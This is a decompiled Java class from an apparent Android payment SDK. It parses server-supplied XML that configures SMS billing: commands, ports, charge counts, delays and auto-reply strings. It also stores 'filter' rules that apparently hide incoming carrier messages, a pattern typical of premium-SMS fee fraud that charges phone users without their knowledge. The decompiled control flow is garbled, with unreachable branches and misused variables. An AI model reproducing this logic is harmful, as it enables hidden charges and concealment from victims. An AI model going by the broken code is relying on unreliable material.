package com.zhangzhifu.sdk.protocolstack;

import android.content.Context;
import android.util.Xml;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.modle.FeeBean;
import com.zhangzhifu.sdk.modle.FeeModeBean;
import com.zhangzhifu.sdk.modle.MMRBean;
import com.zhangzhifu.sdk.modle.MMRProcedure;
import com.zhangzhifu.sdk.modle.MMRWap;
import com.zhangzhifu.sdk.modle.MoreSmsBean;
import com.zhangzhifu.sdk.modle.MoreSmsProcedure;
import com.zhangzhifu.sdk.modle.MoreSmsWap;
import com.zhangzhifu.sdk.modle.OnlineGameBean;
import com.zhangzhifu.sdk.modle.OnlineProcedure;
import com.zhangzhifu.sdk.modle.OnlineWap;
import com.zhangzhifu.sdk.modle.PcOnlineBean;
import com.zhangzhifu.sdk.modle.PcOnlineProcedure;
import com.zhangzhifu.sdk.modle.PcOnlineWap;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.database.DbAdapter;
import com.zhangzhifu.sdk.util.sms.util.RulesTools;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

public class ZhangPayXMLParser
{
  private static String ba;
  private static String bb;
  private List aT;
  private FeeBean aU;
  private OnlineProcedure aV;
  private PcOnlineProcedure aW;
  private MoreSmsProcedure aX;
  private MMRProcedure aY;
  private String aZ;
  private Context ao;
  private DbAdapter bc;
  
  public ZhangPayXMLParser() {}
  
  public List readXML(StringReader paramStringReader, Context paramContext)
  {
    this.ao = paramContext;
    localXmlPullParser = Xml.newPullParser();
    try
    {
      localXmlPullParser.setInput(paramStringReader);
      i = localXmlPullParser.getEventType();
      ZhangPayLog.showSaveLog("Zpay", "eventType类型" + i);
      if (i != 1) {
        break label272;
      }
      paramStringReader.close();
    }
    catch (XmlPullParserException paramStringReader)
    {
      for (;;)
      {
        int i;
        paramStringReader.printStackTrace();
        ZhangPayLog.showSaveLog("Zpay", "解析文档失败　XmlPullParserException　" + paramStringReader.getMessage());
        continue;
        ZhangPayLog.v("zhangPay_log", "解析startTag");
        localObject = localXmlPullParser.getName();
        ZhangPayLog.v("zhangPay_log", "start_tag " + (String)localObject);
        if ((((String)localObject).equals("root")) || (((String)localObject).equals("procedure_1")) || (((String)localObject).equals("mutual")) || (((String)localObject).equals("procedure_pc1")) || (((String)localObject).equals("mutual_pc")) || (((String)localObject).equals("procedure_mm1")) || (((String)localObject).equals("mutual_mm")) || (((String)localObject).equals("procedure_mm1")) || (((String)localObject).equals("mutual_mm")) || (((String)localObject).equals("procedure_wo1")) || (((String)localObject).equals("mutual_wo")) || (((String)localObject).equals("mutual_mux")) || (((String)localObject).equals("procedure_mux")) || (((String)localObject).equals("gateway"))) {
          break label3039;
        }
        String str1 = localXmlPullParser.nextText();
        try
        {
          if (!((String)localObject).equalsIgnoreCase("order_id")) {
            break;
          }
          SharePreferUtil.setOrderId(this.ao, str1);
          ZhangPayLog.v("zhangPay_log", "OrderId " + SharePreferUtil.getOrderId(this.ao));
        }
        catch (Exception localException1)
        {
          ZhangPayLog.showSaveLog("zhangPay_log", "协议解析属性错误" + localException1.getMessage());
        }
      }
    }
    catch (IOException paramStringReader)
    {
      for (;;)
      {
        label272:
        Object localObject;
        paramStringReader.printStackTrace();
        ZhangPayLog.showSaveLog("Zpay", "解析文档失败　IOException" + paramStringReader.getMessage());
        continue;
        if (!((String)localObject).equalsIgnoreCase("version")) {
          if (((String)localObject).equalsIgnoreCase("fee_type")) {
            SharePreferUtil.setFeeType(this.ao, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_interval")) {
            SharePreferUtil.setCallInterval(this.ao, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("call_max")) {
            SharePreferUtil.setMaxCall(this.ao, Integer.parseInt(localException1));
          } else if (((String)localObject).equalsIgnoreCase("fee")) {
            SharePreferUtil.setFee(this.ao, localException1);
          } else if (((String)localObject).equalsIgnoreCase("prod_name")) {
            SharePreferUtil.setProdName(this.ao, localException1);
          } else if (((String)localObject).equalsIgnoreCase("supp_name")) {
            SharePreferUtil.setSuppName(this.ao, localException1);
          } else if (((String)localObject).equalsIgnoreCase("view_url")) {
            com.zhangzhifu.sdk.ui.FeeView.showString = localException1;
          } else if (!((String)localObject).equalsIgnoreCase("gateway")) {
            if (((String)localObject).equalsIgnoreCase("op"))
            {
              this.aZ = localException1;
            }
            else if (((String)localObject).equalsIgnoreCase("load_times"))
            {
              if (Integer.valueOf(localException1).intValue() < 10)
              {
                SharePreferUtil.getInstance();
                SharePreferUtil.setLoadingDisplay(this.ao, 10);
              }
              else
              {
                SharePreferUtil.getInstance();
                SharePreferUtil.setLoadingDisplay(this.ao, Integer.valueOf(localException1).intValue());
              }
            }
            else if (((String)localObject).equalsIgnoreCase("fee_mode"))
            {
              localObject = new FeeModeBean();
              if (localException1.equalsIgnoreCase("0"))
              {
                SharePreferUtil.getInstance().setFeeMode(this.ao, "0");
                ((FeeModeBean)localObject).setFeemode("0");
                this.aU = new SMSBean();
                ((SMSBean)this.aU).setSms(true);
              }
              else if (localException1.equalsIgnoreCase("7"))
              {
                SharePreferUtil.getInstance().setFeeMode(this.ao, "7");
                ((FeeModeBean)localObject).setFeemode("7");
                this.aU = new SMSBean();
                ((SMSBean)this.aU).setSms(false);
              }
              else if ((localException1.equalsIgnoreCase("13")) || (localException1.equalsIgnoreCase("14")))
              {
                ((FeeModeBean)localObject).setFeemode("13");
                SharePreferUtil.getInstance().setFeeMode(this.ao, "13");
                this.aU = new OnlineGameBean();
              }
              else if (localException1.equalsIgnoreCase("15"))
              {
                ((FeeModeBean)localObject).setFeemode("15");
                SharePreferUtil.getInstance().setFeeMode(this.ao, "15");
                this.aU = new PcOnlineBean();
              }
              else if (localException1.equalsIgnoreCase("16"))
              {
                ((FeeModeBean)localObject).setFeemode("16");
                SharePreferUtil.getInstance().setFeeMode(this.ao, "16");
                this.aU = new MMRBean();
              }
              else if (localException1.equalsIgnoreCase("18"))
              {
                ((FeeModeBean)localObject).setFeemode("18");
                SharePreferUtil.getInstance().setFeeMode(this.ao, "18");
              }
              else if (localException1.equalsIgnoreCase("19"))
              {
                ((FeeModeBean)localObject).setFeemode("19");
                SharePreferUtil.getInstance().setFeeMode(this.ao, "19");
                this.aU = new MoreSmsBean();
              }
              else
              {
                this.aU = new OnlineWap();
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_pop"))
            {
              SharePreferUtil.setIsPOP(this.ao, Integer.parseInt(localException1));
            }
            else if (((String)localObject).equalsIgnoreCase("cmd"))
            {
              if ((this.aU instanceof SMSBean)) {
                ((SMSBean)this.aU).setCmd(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("port"))
            {
              if ((this.aU instanceof SMSBean)) {
                ((SMSBean)this.aU).setPort(localException1);
              }
            }
            else if (((String)localObject).equalsIgnoreCase("is_filter"))
            {
              this.aU.setIsFilter(localException1);
            }
            else if (((String)localObject).equalsIgnoreCase("is_second"))
            {
              if ((this.aU instanceof SMSBean)) {
                ((SMSBean)this.aU).setIsSecond(Integer.parseInt(localException1));
              }
            }
            else
            {
              if (((String)localObject).equalsIgnoreCase("filter_port"))
              {
                if ((SharePreferUtil.getInstance().getFilterPort(this.ao) == null) || (SharePreferUtil.getInstance().getFilterPort(this.ao).equals(""))) {
                  SharePreferUtil.getInstance().setFilterPort(this.ao, localException1);
                }
                for (;;)
                {
                  ba = localException1;
                  this.aU.setFilterPort(localException1);
                  break;
                  SharePreferUtil.getInstance().setFilterPort(this.ao, localException1);
                }
              }
              if (((String)localObject).equalsIgnoreCase("second_info"))
              {
                SharePreferUtil.getInstance();
                SharePreferUtil.setSmsBodyKey(this.ao, localException1);
              }
              else if (((String)localObject).equalsIgnoreCase("filter_info"))
              {
                ZhangPayLog.d("zhangPay_log", "需要过滤的信息为" + localException1);
                bb = localException1;
                this.aU.setFilterInfo(localException1);
              }
              else if (((String)localObject).equalsIgnoreCase("second_type"))
              {
                SharePreferUtil.getInstance().setSendType(this.ao, localException1);
                boolean bool = this.aU instanceof SMSBean;
                if (bool) {
                  try
                  {
                    ((SMSBean)this.aU).setSecondType(Integer.parseInt(localException1));
                  }
                  catch (Exception localException2) {}
                }
              }
              else if (((String)localObject).equalsIgnoreCase("second_port"))
              {
                if ((this.aU instanceof SMSBean)) {
                  ((SMSBean)this.aU).setSecondPort(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_start_str"))
              {
                SharePreferUtil.getInstance().setSmsCodeBegin(this.ao, localException2);
                if ((this.aU instanceof SMSBean)) {
                  ((SMSBean)this.aU).setReplyStartStr(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_end_str"))
              {
                SharePreferUtil.getInstance().setSmsCodeEnd(this.ao, localException2);
                if ((this.aU instanceof SMSBean)) {
                  ((SMSBean)this.aU).setReplyEndStr(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("reply_content"))
              {
                if ((this.aU instanceof SMSBean)) {
                  ((SMSBean)this.aU).setReplyContent(localException2);
                }
              }
              else if (((String)localObject).equalsIgnoreCase("charge_count"))
              {
                if ((this.aU instanceof SMSBean)) {
                  ((SMSBean)this.aU).setChargeCount(Integer.parseInt(localException2));
                }
              }
              else if (((String)localObject).equalsIgnoreCase("sms_delay_time"))
              {
                if (((this.aU instanceof SMSBean)) && (!localException2.trim().equals(""))) {
                  ((SMSBean)this.aU).setSmsDelayTime(Integer.parseInt(localException2));
                }
              }
              else if (!((String)localObject).equalsIgnoreCase("mutual_mux"))
              {
                if (((String)localObject).equalsIgnoreCase("procedure_mux")) {
                  this.aX = new MoreSmsProcedure();
                } else if (((String)localObject).equalsIgnoreCase("a_url_mux"))
                {
                  if (this.aX != null) {
                    this.aX.setA_url(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("type_mux"))
                {
                  if (this.aX != null) {
                    this.aX.setType(Integer.parseInt(localException2));
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("sms_num_mux"))
                {
                  if (this.aX != null) {
                    this.aX.setSms_num(localException2);
                  }
                }
                else if (((String)localObject).equalsIgnoreCase("timer_mux"))
                {
                  if (this.aX != null) {
                    this.aX.setTimer(Integer.parseInt(localException2));
                  }
                }
                else if (!((String)localObject).equalsIgnoreCase("mutual")) {
                  if (((String)localObject).equalsIgnoreCase("procedure_1")) {
                    this.aV = new OnlineProcedure();
                  } else if (((String)localObject).equalsIgnoreCase("a_url_1"))
                  {
                    if (this.aV != null) {
                      this.aV.setA_url(localException2);
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("timer_1"))
                  {
                    if (this.aV != null) {
                      this.aV.setTimer(Integer.parseInt(localException2));
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("type_1"))
                  {
                    if (this.aV != null) {
                      this.aV.setType(Integer.parseInt(localException2));
                    }
                  }
                  else if (((String)localObject).equalsIgnoreCase("sms_num_1"))
                  {
                    if (this.aV != null) {
                      this.aV.setSms_num(localException2);
                    }
                  }
                  else if (!((String)localObject).equalsIgnoreCase("mutual_mm")) {
                    if (((String)localObject).equalsIgnoreCase("procedure_mm1")) {
                      this.aY = new MMRProcedure();
                    } else if (((String)localObject).equalsIgnoreCase("a_url_mm1"))
                    {
                      if (this.aY != null) {
                        this.aY.setA_url(localException2);
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("type_mm1"))
                    {
                      if (this.aY != null) {
                        this.aY.setType(Integer.parseInt(localException2));
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("sms_num_mm1"))
                    {
                      if (this.aY != null) {
                        this.aY.setSms_num(localException2);
                      }
                    }
                    else if (((String)localObject).equalsIgnoreCase("timer_mm1"))
                    {
                      if (this.aY != null) {
                        this.aY.setTimer(Integer.parseInt(localException2));
                      }
                    }
                    else if (!((String)localObject).equalsIgnoreCase("mutual_pc")) {
                      if (((String)localObject).equalsIgnoreCase("procedure_pc1"))
                      {
                        this.aW = new PcOnlineProcedure();
                      }
                      else if (((String)localObject).equalsIgnoreCase("a_url_pc1"))
                      {
                        if (this.aW != null) {
                          this.aW.setA_url(localException2);
                        }
                      }
                      else if (((String)localObject).equalsIgnoreCase("timer_pc1"))
                      {
                        if (this.aW != null) {
                          this.aW.setTimer(Integer.parseInt(localException2));
                        }
                      }
                      else if (((String)localObject).equalsIgnoreCase("type_pc1"))
                      {
                        if (this.aW != null) {
                          this.aW.setType(Integer.parseInt(localException2));
                        }
                      }
                      else if ((((String)localObject).equalsIgnoreCase("sms_num_pc1")) && (this.aW != null))
                      {
                        this.aW.setSms_num(localException2);
                        continue;
                        ZhangPayLog.v("zhangPay_log", "解析endTag");
                        String str2 = localXmlPullParser.getName();
                        ZhangPayLog.v("zhangPay_log", "end_tag " + str2);
                        if (str2.equalsIgnoreCase("gateway"))
                        {
                          if ((this.aT != null) && (this.aU != null))
                          {
                            this.aT.add(this.aU);
                            ZhangPayLog.v("zhangPay_log", "endTag+allFees" + this.aT.size());
                          }
                        }
                        else if (str2.equalsIgnoreCase("procedure_1"))
                        {
                          if ((this.aU instanceof OnlineWap))
                          {
                            ZhangPayLog.v("zhangPay_log", "currentProed is " + this.aV);
                            ((OnlineWap)this.aU).getAllProcedure().add(this.aV);
                          }
                        }
                        else if (str2.equalsIgnoreCase("procedure_pc1"))
                        {
                          if ((this.aU instanceof PcOnlineWap))
                          {
                            ZhangPayLog.v("zhangPay_log", "currentProed is " + this.aW);
                            ((PcOnlineWap)this.aU).getAllProcedure().add(this.aW);
                          }
                        }
                        else if (str2.equalsIgnoreCase("procedure_mux"))
                        {
                          if ((this.aU instanceof MoreSmsWap))
                          {
                            ZhangPayLog.v("zhangPay_log", "currentProed is " + this.aX);
                            ((MoreSmsWap)this.aU).getAllProcedure().add(this.aX);
                          }
                        }
                        else if (str2.equalsIgnoreCase("procedure_mm1"))
                        {
                          if ((this.aU instanceof MMRWap)) {
                            ((MMRWap)this.aU).getAllProcedure().add(this.aY);
                          }
                        }
                        else if (str2.equalsIgnoreCase("root"))
                        {
                          ZhangPayLog.v("zhangPay_log", "已经完成");
                          continue;
                          this.bc.createOne(ba.toLowerCase(), 0);
                          continue;
                          paramStringReader = ba.concat("*");
                          RulesTools.getInstance().addRuleToDatabaes(paramContext, 0, 0, paramStringReader);
                          continue;
                          RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, bb);
                          continue;
                          str2 = null;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    this.bc = new DbAdapter(paramContext);
    if ((ba != null) && (ba.length() > 0))
    {
      if (ba.contains("#"))
      {
        paramStringReader = ba.substring(0, ba.lastIndexOf("#"));
        this.bc.createOne(paramStringReader.toLowerCase(), 0);
      }
    }
    else
    {
      if ((ba != null) && (ba.length() > 0))
      {
        if (!ba.contains("#")) {
          break label3001;
        }
        paramStringReader = ba.substring(0, ba.lastIndexOf("#")).concat("*");
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 0, 0, paramStringReader);
      }
      if ((bb != null) && (bb.length() > 0))
      {
        if (!bb.contains("#")) {
          break label3023;
        }
        paramStringReader = bb.substring(0, bb.lastIndexOf("#"));
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, paramStringReader);
        paramStringReader = bb.substring(bb.lastIndexOf("#") + 1, bb.length());
        RulesTools.getInstance().addRuleToDatabaes(paramContext, 8, 0, paramStringReader);
      }
      return this.aT;
      switch (i)
      {
      case 1: 
      default: 
      case 0: 
        for (;;)
        {
          i = localXmlPullParser.next();
          break;
          ZhangPayLog.showSaveLog("Zpay", "START_DOCUMENT");
          this.aT = new ArrayList();
        }
      }
    }
  }
}
